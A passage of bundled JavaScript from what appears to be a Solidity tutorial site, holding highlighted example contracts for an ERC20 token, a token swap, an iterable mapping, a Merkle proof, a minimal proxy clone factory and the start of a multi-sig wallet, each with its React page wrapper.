class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> <span class=\"hljs-keyword\">from</span>, <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> to, <span class=\"hljs-keyword\">uint256</span> value</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Approval</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> owner, <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> spender, <span class=\"hljs-keyword\">uint256</span> value</span>)</span>;\n}\n</code></pre>\n<h2 id=\"create-your-own-erc20-token\">Create your own ERC20 token</h2>\n<p>Using <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts\" target=\"__blank\">Open Zeppelin</a> it&#39;s really easy to create your own ERC20 token.</p>\n<p>Here is an example</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/ERC20.sol\"</span>;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MyToken</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">ERC20</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> name, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> symbol</span>) <span class=\"hljs-title\">ERC20</span>(<span class=\"hljs-params\">name, symbol</span>) </span>{\n        <span class=\"hljs-comment\">// Mint 100 tokens to msg.sender</span>\n        <span class=\"hljs-comment\">// Similar to how</span>\n        <span class=\"hljs-comment\">// 1 dollar = 100 cents</span>\n        <span class=\"hljs-comment\">// 1 token = 1 * (10 ** decimals)</span>\n        _mint(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>, <span class=\"hljs-number\">100</span> * <span class=\"hljs-number\">10</span> ** <span class=\"hljs-keyword\">uint</span>(decimals()));\n    }\n}</code></pre>\n<h2 id=\"contract-to-swap-tokens\">Contract to swap tokens</h2>\n<p>Here is an example contract, <code>TokenSwap</code>, to trade one ERC20 token for another.</p>\n<p>This contract will swap tokens by calling</p>\n<pre><code class=\"language-solidity\">transferFrom(<span class=\"hljs-keyword\">address</span> sender, <span class=\"hljs-keyword\">address</span> recipient, <span class=\"hljs-keyword\">uint256</span> amount)\n</code></pre>\n<p>which will transfer <code>amount</code> of token from <code>sender</code> to <code>recipient</code>.</p>\n<p>For <code>transferFrom</code> to succeed, <code>sender</code> must</p>\n<ul>\n<li>have more than <code>amount</code> tokens in their balance</li>\n<li>allowed <code>TokenSwap</code> to withdraw <code>amount</code> tokens by calling <code>approve</code></li>\n</ul>\n<p>prior to <code>TokenSwap</code> calling <code>transferFrom</code></p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol\"</span>;\n\n<span class=\"hljs-comment\">/*\nHow to swap tokens\n\n1. Alice has 100 tokens from AliceCoin, which is a ERC20 token.\n2. Bob has 100 tokens from BobCoin, which is also a ERC20 token.\n3. Alice and Bob wants to trade 10 AliceCoin for 20 BobCoin.\n4. Alice or Bob deploys TokenSwap\n5. Alice appproves TokenSwap to withdraw 10 tokens from AliceCoin\n6. Bob appproves TokenSwap to withdraw 20 tokens from BobCoin\n7. Alice or Bob calls TokenSwap.swap()\n8. Alice and Bob traded tokens successfully.\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TokenSwap</span> </span>{\n    IERC20 <span class=\"hljs-keyword\">public</span> token1;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner1;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> amount1;\n    IERC20 <span class=\"hljs-keyword\">public</span> token2;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner2;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> amount2;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">address</span> _token1,\n        <span class=\"hljs-keyword\">address</span> _owner1,\n        <span class=\"hljs-keyword\">uint</span> _amount1,\n        <span class=\"hljs-keyword\">address</span> _token2,\n        <span class=\"hljs-keyword\">address</span> _owner2,\n        <span class=\"hljs-keyword\">uint</span> _amount2\n    </span>) </span>{\n        token1 = IERC20(_token1);\n        owner1 = _owner1;\n        amount1 = _amount1;\n        token2 = IERC20(_token2);\n        owner2 = _owner2;\n        amount2 = _amount2;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">swap</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == owner1 || <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span> == owner2, <span class=\"hljs-string\">\"Not authorized\"</span>);\n        <span class=\"hljs-built_in\">require</span>(\n            token1.allowance(owner1, <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>)) &gt;= amount1,\n            <span class=\"hljs-string\">\"Token 1 allowance too low\"</span>\n        );\n        <span class=\"hljs-built_in\">require</span>(\n            token2.allowance(owner2, <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-built_in\">this</span>)) &gt;= amount2,\n            <span class=\"hljs-string\">\"Token 2 allowance too low\"</span>\n        );\n\n        _safeTransferFrom(token1, owner1, owner2, amount1);\n        _safeTransferFrom(token2, owner2, owner1, amount2);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_safeTransferFrom</span>(<span class=\"hljs-params\">\n        IERC20 token,\n        <span class=\"hljs-keyword\">address</span> sender,\n        <span class=\"hljs-keyword\">address</span> recipient,\n        <span class=\"hljs-keyword\">uint</span> amount\n    </span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">private</span></span> </span>{\n        <span class=\"hljs-keyword\">bool</span> sent = token.transferFrom(sender, recipient, amount);\n        <span class=\"hljs-built_in\">require</span>(sent, <span class=\"hljs-string\">\"Token transfer failed\"</span>);\n    }\n}</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Iterable Mapping\"\nexport const description = \"Iterable Mapping in Solidity\"\n\nconst html = `<p>You cannot iterate through a <code>mapping</code>. So here is an example of how to create an iterable <code>mapping</code>.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">library</span> <span class=\"hljs-title\">IterableMapping</span> </span>{\n    <span class=\"hljs-comment\">// Iterable mapping from address to uint;</span>\n    <span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">Map</span> {\n        <span class=\"hljs-keyword\">address</span>[] keys;\n        <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) values;\n        <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) indexOf;\n        <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">bool</span>) inserted;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">Map <span class=\"hljs-keyword\">storage</span> map, <span class=\"hljs-keyword\">address</span> key</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> map.values[key];\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getKeyAtIndex</span>(<span class=\"hljs-params\">Map <span class=\"hljs-keyword\">storage</span> map, <span class=\"hljs-keyword\">uint</span> index</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> map.keys[index];\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">size</span>(<span class=\"hljs-params\">Map <span class=\"hljs-keyword\">storage</span> map</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> map.keys.<span class=\"hljs-built_in\">length</span>;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">set</span>(<span class=\"hljs-params\">Map <span class=\"hljs-keyword\">storage</span> map, <span class=\"hljs-keyword\">address</span> key, <span class=\"hljs-keyword\">uint</span> val</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">if</span> (map.inserted[key]) {\n            map.values[key] = val;\n        } <span class=\"hljs-keyword\">else</span> {\n            map.inserted[key] = <span class=\"hljs-literal\">true</span>;\n            map.values[key] = val;\n            map.indexOf[key] = map.keys.<span class=\"hljs-built_in\">length</span>;\n            map.keys.<span class=\"hljs-built_in\">push</span>(key);\n        }\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">remove</span>(<span class=\"hljs-params\">Map <span class=\"hljs-keyword\">storage</span> map, <span class=\"hljs-keyword\">address</span> key</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">if</span> (!map.inserted[key]) {\n            <span class=\"hljs-keyword\">return</span>;\n        }\n\n        <span class=\"hljs-keyword\">delete</span> map.inserted[key];\n        <span class=\"hljs-keyword\">delete</span> map.values[key];\n\n        <span class=\"hljs-keyword\">uint</span> index = map.indexOf[key];\n        <span class=\"hljs-keyword\">uint</span> lastIndex = map.keys.<span class=\"hljs-built_in\">length</span> - <span class=\"hljs-number\">1</span>;\n        <span class=\"hljs-keyword\">address</span> lastKey = map.keys[lastIndex];\n\n        map.indexOf[lastKey] = index;\n        <span class=\"hljs-keyword\">delete</span> map.indexOf[key];\n\n        map.keys[index] = lastKey;\n        map.keys.<span class=\"hljs-built_in\">pop</span>();\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TestIterableMap</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">IterableMapping</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\">IterableMapping</span>.<span class=\"hljs-title\">Map</span>;\n\n    IterableMapping.Map <span class=\"hljs-keyword\">private</span> map;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testIterableMap</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        map.set(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">0</span>), <span class=\"hljs-number\">0</span>);\n        map.set(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">1</span>), <span class=\"hljs-number\">100</span>);\n        map.set(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">200</span>); <span class=\"hljs-comment\">// insert</span>\n        map.set(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">2</span>), <span class=\"hljs-number\">200</span>); <span class=\"hljs-comment\">// update</span>\n        map.set(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">300</span>);\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; map.size(); i++) {\n            <span class=\"hljs-keyword\">address</span> key = map.getKeyAtIndex(i);\n\n            <span class=\"hljs-built_in\">assert</span>(map.get(key) == i * <span class=\"hljs-number\">100</span>);\n        }\n\n        map.remove(<span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">1</span>));\n\n        <span class=\"hljs-comment\">// keys = [address(0), address(3), address(2)]</span>\n        <span class=\"hljs-built_in\">assert</span>(map.size() == <span class=\"hljs-number\">3</span>);\n        <span class=\"hljs-built_in\">assert</span>(map.getKeyAtIndex(<span class=\"hljs-number\">0</span>) == <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">0</span>));\n        <span class=\"hljs-built_in\">assert</span>(map.getKeyAtIndex(<span class=\"hljs-number\">1</span>) == <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">3</span>));\n        <span class=\"hljs-built_in\">assert</span>(map.getKeyAtIndex(<span class=\"hljs-number\">2</span>) == <span class=\"hljs-keyword\">address</span>(<span class=\"hljs-number\">2</span>));\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Merkle Tree\"\nexport const description = \"Learn about Merkle tree in Solidity\"\n\nconst html = `<p>Merkle tree allows you to cryptographically prove that an element is contained</p>\n<p>in a set without revealing the entire set.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MerkleProof</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">verify</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">bytes32</span>[] <span class=\"hljs-keyword\">memory</span> proof, <span class=\"hljs-keyword\">bytes32</span> root, <span class=\"hljs-keyword\">bytes32</span> leaf, <span class=\"hljs-keyword\">uint</span> index\n    </span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>)\n    </span>{\n        <span class=\"hljs-keyword\">bytes32</span> hash = leaf;\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; proof.<span class=\"hljs-built_in\">length</span>; i++) {\n            <span class=\"hljs-keyword\">bytes32</span> proofElement = proof[i];\n\n            <span class=\"hljs-keyword\">if</span> (index % <span class=\"hljs-number\">2</span> == <span class=\"hljs-number\">0</span>) {\n                hash = <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(hash, proofElement));\n            } <span class=\"hljs-keyword\">else</span> {\n                hash = <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(proofElement, hash));\n            }\n\n            index = index / <span class=\"hljs-number\">2</span>;\n        }\n\n        <span class=\"hljs-keyword\">return</span> hash == root;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TestMerkleProof</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">MerkleProof</span> </span>{\n    <span class=\"hljs-keyword\">bytes32</span>[] <span class=\"hljs-keyword\">public</span> hashes;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-keyword\">string</span>[<span class=\"hljs-number\">4</span>] <span class=\"hljs-keyword\">memory</span> transactions = [\n            <span class=\"hljs-string\">\"alice -&gt; bob\"</span>,\n            <span class=\"hljs-string\">\"bob -&gt; dave\"</span>,\n            <span class=\"hljs-string\">\"carol -&gt; alice\"</span>,\n            <span class=\"hljs-string\">\"dave -&gt; bob\"</span>\n        ];\n\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; transactions.<span class=\"hljs-built_in\">length</span>; i++) {\n            hashes.<span class=\"hljs-built_in\">push</span>(<span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(transactions[i])));\n        }\n\n        <span class=\"hljs-keyword\">uint</span> n = transactions.<span class=\"hljs-built_in\">length</span>;\n        <span class=\"hljs-keyword\">uint</span> offset = <span class=\"hljs-number\">0</span>;\n\n        <span class=\"hljs-keyword\">while</span> (n &gt; <span class=\"hljs-number\">0</span>) {\n            <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; n - <span class=\"hljs-number\">1</span>; i+=<span class=\"hljs-number\">2</span>) {\n                hashes.<span class=\"hljs-built_in\">push</span>(\n                    <span class=\"hljs-built_in\">keccak256</span>(<span class=\"hljs-built_in\">abi</span>.<span class=\"hljs-built_in\">encodePacked</span>(\n                        hashes[offset + i],\n                        hashes[offset + i + <span class=\"hljs-number\">1</span>]\n                    ))\n                );\n            }\n            offset += n;\n            n = n / <span class=\"hljs-number\">2</span>;\n        }\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getRoot</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bytes32</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> hashes[hashes.<span class=\"hljs-built_in\">length</span> - <span class=\"hljs-number\">1</span>];\n    }\n\n    <span class=\"hljs-comment\">/* verify\n    3rd leaf\n    0x1bbd78ae6188015c4a6772eb1526292b5985fc3272ead4c65002240fb9ae5d13\n\n    root\n    0x074b43252ffb4a469154df5fb7fe4ecce30953ba8b7095fe1e006185f017ad10\n\n    index\n    2\n\n    proof\n    0x948f90037b4ea787c14540d9feb1034d4a5bc251b9b5f8e57d81e4b470027af8\n    0x63ac1b92046d474f84be3aa0ee04ffe5600862228c81803cce07ac40484aee43\n    */</span>\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Minimal Proxy Contract\"\nexport const description = \"Deploy contracts cheaply with minimal proxy contract\"\n\nconst html = `<p>If you have a contract that will be deployed multiple times, use minimal proxy contract to deploy them cheaply.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">// original code</span>\n<span class=\"hljs-comment\">// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.sol</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MinimalProxy</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">clone</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> target</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> result</span>) </span>{\n        <span class=\"hljs-comment\">// convert address to 20 bytes</span>\n        <span class=\"hljs-keyword\">bytes20</span> targetBytes = <span class=\"hljs-keyword\">bytes20</span>(target);\n\n        <span class=\"hljs-comment\">// actual code //</span>\n        <span class=\"hljs-comment\">// 3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3</span>\n\n        <span class=\"hljs-comment\">// creation code //</span>\n        <span class=\"hljs-comment\">// copy runtime code into memory and return it</span>\n        <span class=\"hljs-comment\">// 3d602d80600a3d3981f3</span>\n\n        <span class=\"hljs-comment\">// runtime code //</span>\n        <span class=\"hljs-comment\">// code to delegatecall to address</span>\n        <span class=\"hljs-comment\">// 363d3d373d3d3d363d73 address 5af43d82803e903d91602b57fd5bf3</span>\n\n        <span class=\"hljs-keyword\">assembly</span> {\n            <span class=\"hljs-comment\">/*\n            reads the 32 bytes of memory starting at pointer stored in 0x40\n\n            In solidity, the 0x40 slot in memory is special: it contains the \"free memory pointer\"\n            which points to the end of the currently allocated memory.\n            */</span>\n            <span class=\"hljs-keyword\">let</span> clone := <span class=\"hljs-built_in\">mload</span>(<span class=\"hljs-number\">0x40</span>)\n            <span class=\"hljs-comment\">// store 32 bytes to memory starting at \"clone\"</span>\n            <span class=\"hljs-built_in\">mstore</span>(clone, <span class=\"hljs-number\">0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000</span>)\n\n            <span class=\"hljs-comment\">/*\n              |              20 bytes                |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000\n                                                      ^\n                                                      pointer\n            */</span>\n            <span class=\"hljs-comment\">// store 32 bytes to memory starting at \"clone\" + 20 bytes</span>\n            <span class=\"hljs-comment\">// 0x14 = 20</span>\n            <span class=\"hljs-built_in\">mstore</span>(<span class=\"hljs-built_in\">add</span>(clone, <span class=\"hljs-number\">0x14</span>), targetBytes)\n\n            <span class=\"hljs-comment\">/*\n              |               20 bytes               |                 20 bytes              |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe\n                                                                                              ^\n                                                                                              pointer\n            */</span>\n            <span class=\"hljs-comment\">// store 32 bytes to memory starting at \"clone\" + 40 bytes</span>\n            <span class=\"hljs-comment\">// 0x28 = 40</span>\n            <span class=\"hljs-built_in\">mstore</span>(<span class=\"hljs-built_in\">add</span>(clone, <span class=\"hljs-number\">0x28</span>), <span class=\"hljs-number\">0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000</span>)\n\n            <span class=\"hljs-comment\">/*\n              |               20 bytes               |                 20 bytes              |           15 bytes          |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3\n            */</span>\n            <span class=\"hljs-comment\">// create new contract</span>\n            <span class=\"hljs-comment\">// send 0 Ether</span>\n            <span class=\"hljs-comment\">// code starts at pointer stored in \"clone\"</span>\n            <span class=\"hljs-comment\">// code size 0x37 (55 bytes)</span>\n            result := <span class=\"hljs-built_in\">create</span>(<span class=\"hljs-number\">0</span>, clone, <span class=\"hljs-number\">0x37</span>)\n        }\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Multi-Sig Wallet\"\nexport const description = \"An example of multi-sig wallet in Solidity\"\n\nconst html = `<p>Let&#39;s create an multi-sig wallet. Here are the specifications.</p>\n<p>The wallet owners can</p>\n<ul>\n<li>submit a transaction</li>\n<li>approve and revoke approval of pending transcations</li>\n<li>anyone can execute a transcation after enough owners has approved it.</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MultiSigWallet</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">Deposit</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> sender, <span class=\"hljs-keyword\">uint</span> amount, <span class=\"hljs-keyword\">uint</span> balance</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">SubmitTransaction</span>(<span class=\"hljs-params\">\n        <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> owner,\n        <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">indexed</span> txIndex,\n        <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> to,\n        <span class=\"hljs-keyword\">uint</span> value,\n        <span class=\"hljs-keyword\">bytes</span> data\n    </span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">ConfirmTransaction</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> owner, <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">indexed</span> txIndex</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">RevokeConfirmation</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> owner, <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">indexed</span> txIndex</span>)</span>;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">event</span> <span class=\"hljs-title\">ExecuteTransaction</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">indexed</span> owner, <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">indexed</span> txIndex</span>)</span>;\n\n    <span class=\"hljs-keyword\">address</span>[] <span class=\"hljs-keyword\">public</span> owners;\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">bool</span>) <span class=\"hljs-keyword\">public</span> isOwner;\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> numConfirmationsRequired;\n\n    <span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">Transaction</span> {\n        <span class=\"hljs-keyword\">address</span> to;\n        <span class=\"hljs-keyword\">uint</span> value;\n        <span class=\"hljs-keyword\">bytes</span> data;\n        <span class=\"hljs-keyword\">bool</span> executed;\n        <span class=\"hljs-keyword\">uint</span> numConfirmations;\n    }\n\n    <span class=\"hljs-comment\">// mapping from tx index =&gt; owner =&gt; bool</span>\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">uint</span> =&gt; <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">bool</span>)) <span class=\"hljs-keyword\">public</span> isConfirmed;\n\n    Transaction[] <span class=\"hljs-keyword\">public</span> transactions;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">modifier</span> <span class=\"hljs-title\">onlyOwner</span>(<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-built_in\">require</span>(isOwner[<span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">sender</span>], <span class=\"hljs-string\">\"not owner\"</span>);\n        <span 